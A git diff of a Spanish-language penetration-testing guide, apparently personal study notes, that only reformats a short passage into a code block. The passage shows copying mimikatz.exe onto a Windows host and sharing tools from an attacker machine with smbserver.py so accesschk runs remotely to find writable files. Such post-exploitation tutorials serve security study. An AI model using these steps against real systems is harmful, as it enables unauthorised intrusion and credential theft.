@@ -1400,10 +1400,12 @@ Posteriormente, nos traemos al equipo los recursos que consideremos:
 move mimikatz.exe C:\Users\s4vitar\Desktop\mimikatz.exe
 ```
 
-Podemos no complicar tanto las cosas, haciendo uso para ello del siguiente procedimiento (A modo de ejemplo, ejecutamos en remoto a tiempo real sobre el equipo Windows el binario _accesschk_v5.02.exe_:
+Podemos no complicar tanto las cosas, haciendo uso para ello del siguiente procedimiento (A modo de ejemplo, ejecutamos en remoto a tiempo real sobre el equipo Windows el binario _*accesschk_v5.02.exe*_:
 
-* smbserver.py parrotSmbFolder ~/Recurso/ # Especificamos el directorio cuyos recursos queremos compartir
-* \\IP\parrotSmbFolder\accesschk_v5.02.exe -accepteula -uwqs "usuario" C:\*.*
+```bash
+$~ smbserver.py parrotSmbFolder ~/Recurso/ # Especificamos el directorio cuyos recursos queremos compartir
+C:\DOCUME~1\ \\IP\parrotSmbFolder\accesschk_v5.02.exe -accepteula -uwqs "usuario" C:\*.*
+```
 
 Esto a su vez nos sirve para copiar archivos del recurso compartido por Samba.
 
